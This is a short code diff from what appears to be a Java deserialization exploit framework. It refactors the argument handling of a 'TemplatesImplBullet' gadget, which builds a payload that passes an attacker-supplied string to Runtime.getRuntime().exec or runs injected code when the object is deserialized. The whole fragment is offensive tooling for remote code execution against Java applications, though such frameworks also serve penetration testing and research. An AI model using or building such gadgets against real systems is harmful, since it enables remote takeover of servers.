@@ -23,7 +23,7 @@ import java.io.Serializable;
  * @since 2020/2/17
  */
 @SuppressWarnings({"rawtypes"})
-@Dependencies({"Allowed Templates Deserialize"})
+@Dependencies({"set --args command"})
 @Authors({ Authors.WH1T3P1G })
 public class TemplatesImplBullet implements ObjectGadget<Object> {
 
@@ -32,13 +32,13 @@ public class TemplatesImplBullet implements ObjectGadget<Object> {
     private Class transformerFactoryImpl;
     private String body;
 
-    public TemplatesImplBullet(String[] args) {
+    public TemplatesImplBullet(String args) {
         args = args == null? PayloadHelper.defaultTestCommand() : args;
-        if(args.length == 2){// code mode
-            this.body = args[1];
-        }else if(args.length == 1){// system command execute mode
+        if(args.startsWith("code:")){// code mode
+            this.body = args.substring(5);
+        }else{// system command execute mode
             this.body = "java.lang.Runtime.getRuntime().exec(\"" +
-                    args[0].replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
+                    args.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
                     "\");";
         }
         try {
